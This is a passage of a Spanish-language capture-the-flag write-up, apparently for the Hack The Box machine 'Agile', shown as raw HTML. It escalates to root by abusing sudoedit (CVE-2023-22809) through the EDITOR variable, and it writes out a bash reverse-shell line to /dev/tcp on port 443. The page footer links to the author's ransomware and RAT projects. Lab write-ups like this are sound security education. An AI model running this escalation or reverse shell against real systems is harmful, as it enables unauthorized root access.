Matching Defaults entries <span class="k">for </span>edwards on agile:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin, use_pty

User edwards may run the following commands on agile:
    <span class="o">(</span>dev_admin : dev_admin<span class="o">)</span> sudoedit /app/config_test.json
    <span class="o">(</span>dev_admin : dev_admin<span class="o">)</span> sudoedit /app/app-testing/tests/functional/creds.txt
</code></pre></div></div> <p>Al buscar en google una posible via de escalacion con sudoedit, encontre esto:</p> <ul> <li> <p><a href="https://exploit-notes.hdks.org/exploitlinux/privilege-escalation/sudo/sudoedit-privilege-escalation/">https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudoedit-privilege-escalation/</a></p> </li> <li> <p><a href="https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf">https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf</a></p> </li> </ul> <p>Vemos que nos permite convertirnos en root mediante la variable de entorno <code class="highlighter-rouge">EDITOR</code></p> <p>Primero exportamos la variable de entorno EDITOR con este valor:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">EDITOR</span><span class="o">=</span><span class="s1">'vim -- /app/venv/bin/activate'</span>
</code></pre></div></div> <p>Y es con ese valor por que al mostrar los archivos que pertenecen el grupo dev_admin, tenemos el <code class="highlighter-rouge">activate</code>:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>edwards@agile:~<span class="nv">$ </span>find / <span class="nt">-group</span> dev_admin 2&gt;/dev/null
/home/dev_admin
/app/venv
/app/venv/bin
/app/venv/bin/activate
/app/venv/bin/Activate.ps1
/app/venv/bin/activate.fish
/app/venv/bin/activate.csh
</code></pre></div></div> <p>Despues editamos el archivo <code class="highlighter-rouge">config_test.json</code></p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-u</span> dev_admin sudoedit /app/config_test.json
</code></pre></div></div> <p>Y al principio agregamos una reverse shell:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/&lt;tu_IP&gt;/443 0&gt;&amp;1
</code></pre></div></div> <p>De esta manera</p> <p><img src="/assets/img/agile/12.png" alt="" /></p> <p>Despues guardamos y salimos y unos segundos despues nos llegara una conexion como root</p> <p><img src="/assets/img/agile/11.png" alt="" /></p> <p>Eso ha sido todo, gracias por leer ❤</p> <p><img src="/assets/img/agile/waifu.gif" alt="" /></p> <br> <a href="https://twitter.com/intent/tweet?text=http://localhost:4000/htb-agile/" class="btn btn_twitter" title="Share on Twitter"><i class="fa fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a> <a href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/htb-agile/" class="btn btn_facebook" title="Share on Facebook"><i class="fa fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a> <a href="https://plus.google.com/share?url=http://localhost:4000/htb-agile/" class="btn btn_google-plus" title="Share on Google Plus"><i class="fa fa-fw fa-google-plus" aria-hidden="true"></i><span> Google+</span></a> <nav class="pagination"> <a href="http://localhost:4000/heap-queueUserApc/" class="pagination_pager" title="Shellcode almacenada en el heap e inyección vía APC injection y NtTestAlert en un proceso local ">previous</a> <a href="#" class="pagination_pager disabled">next</a> </nav> </div> </div> <!-- JS --> <script src="http://localhost:4000/assets/js/main.min.js"></script> <div class="overlay"> <ul class="projects-menu"> <li style="background:url(https://www.drunkgaming.net/uploads/monthly_2023_07/ucmd1fimkara1.gif.dfdd0c0d3b5e1def01e9bc009ff1d853.gif) center center no-repeat;"> <a href="https://github.com/ic4rta/NazunaRansom" target="_blank" rel="nofollow external"> <span> Nazuna Ransomware </span> </a> </li> <li style="background:url(https://i.pinimg.com/originals/0c/af/9f/0caf9f7b8ab4917287aaaf8b8b772cd7.gif) center center no-repeat;"> <a href="https://github.com/ic4rta/Synergy-RAT" target="_blank" rel="nofollow external"> <span> Synergy-RAT </span> </a> </li> <li style="background:url(https://media.tenor.com/XbbgjUJaLe0AAAAC/kumiko-oumae-nono.gif) center center no-repeat;"> <a href="https://github.com/ic4rta/PEjector" target="_blank" rel="nofollow external"> <span> PEjector </span> </a> </li> <li style="background:url(https://media.tenor.com/c7fsPiG8UwIAAAAC/bocchi-the-rock-anime.gif) center center no-repeat;"> <a href="https://github.com/ic4rta/ISCAN" target="_blank" rel="nofollow external"> <span> ISCAN </span> </a> </li> </ul> </div> </body> </html>
